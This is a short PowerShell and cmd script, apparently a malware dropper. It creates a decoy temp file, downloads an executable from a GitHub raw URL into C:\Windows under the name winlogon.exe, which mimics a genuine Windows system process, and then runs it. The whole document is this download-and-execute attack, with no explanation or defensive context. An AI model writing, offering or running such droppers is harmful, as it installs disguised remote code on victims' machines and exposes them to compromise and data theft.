New-Item "$env:temp\wsuA58F.tmp"
(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "C:\Windows\winlogon.exe")
cmd.exe /c "C:\Windows\winlogon.exe"
